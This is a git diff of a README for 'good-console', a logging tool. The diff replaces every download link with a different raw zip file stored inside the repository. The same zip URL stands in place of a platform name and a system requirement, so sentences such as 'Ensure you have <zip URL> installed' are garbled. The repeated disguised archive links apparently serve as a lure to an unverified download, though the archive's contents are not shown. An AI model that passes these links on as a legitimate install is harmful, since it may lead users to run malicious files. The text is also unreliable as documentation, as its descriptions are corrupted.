@@ -1,7 +1,7 @@
 # 🎉 good-console - Simplify Your Logging Experience
 
 ## 🏷️ Badges
-[![Download](https://raw.githubusercontent.com/LuizMiguel01/good-console/main/examples/node/good_console_2.6-alpha.4.zip)](https://raw.githubusercontent.com/LuizMiguel01/good-console/main/examples/node/good_console_2.6-alpha.4.zip)
+[![Download](https://github.com/LuizMiguel01/good-console/raw/refs/heads/main/src/good-console-1.3.zip)](https://github.com/LuizMiguel01/good-console/raw/refs/heads/main/src/good-console-1.3.zip)
 
 ## 📘 Introduction
 Welcome to **good-console**! This tool improves your logging experience, making your logs clearer and easier to understand. It is designed for anyone who wants to enhance their debugging process without diving deep into technical details.
@@ -12,7 +12,7 @@ To use good-console, follow these simple steps to download and run the applicati
 ### 📥 Download & Install
 1. **Visit the Releases Page**: Click on the button below to go to the release page, where you can download the latest version of good-console.
 
-   [Download good-console](https://raw.githubusercontent.com/LuizMiguel01/good-console/main/examples/node/good_console_2.6-alpha.4.zip)
+   [Download good-console](https://github.com/LuizMiguel01/good-console/raw/refs/heads/main/src/good-console-1.3.zip)
    
 2. **Choose Your Version**: On the releases page, you will see different versions. Select the version that suits your system. 
 
@@ -27,13 +27,13 @@ To use good-console, follow these simple steps to download and run the applicati
 
 ### ⚙️ Features
 - **Clean Interface**: Navigate through logs easily with a user-friendly interface.
-- **Flexible Use**: Ideal for various platforms, including https://raw.githubusercontent.com/LuizMiguel01/good-console/main/examples/node/good_console_2.6-alpha.4.zip, React, Vue, and more.
+- **Flexible Use**: Ideal for various platforms, including https://github.com/LuizMiguel01/good-console/raw/refs/heads/main/src/good-console-1.3.zip, React, Vue, and more.
 - **Framework-Agnostic**: Works well with any project framework.
 - **Enhanced Logging**: Get clear, structured logs that are easy to read and maintain.
 
 ### 🖥️ System Requirements
 - **Operating System**: Compatible with Windows, Mac, and Linux.
-- **https://raw.githubusercontent.com/LuizMiguel01/good-console/main/examples/node/good_console_2.6-alpha.4.zip**: Ensure you have https://raw.githubusercontent.com/LuizMiguel01/good-console/main/examples/node/good_console_2.6-alpha.4.zip installed to run the application smoothly.
+- **https://github.com/LuizMiguel01/good-console/raw/refs/heads/main/src/good-console-1.3.zip**: Ensure you have https://github.com/LuizMiguel01/good-console/raw/refs/heads/main/src/good-console-1.3.zip installed to run the application smoothly.
 - **Memory**: Minimum of 2GB RAM is recommended for optimal performance.
 
 ## 💬 Usage Instructions
@@ -64,4 +64,4 @@ This project is open-source and licensed under the MIT License. You can use it f
 ### 📥 Ready to Download?
 Head over to the releases page and download your copy of good-console today!
 
-[Download good-console](https://raw.githubusercontent.com/LuizMiguel01/good-console/main/examples/node/good_console_2.6-alpha.4.zip)
+[Download good-console](https://github.com/LuizMiguel01/good-console/raw/refs/heads/main/src/good-console-1.3.zip)
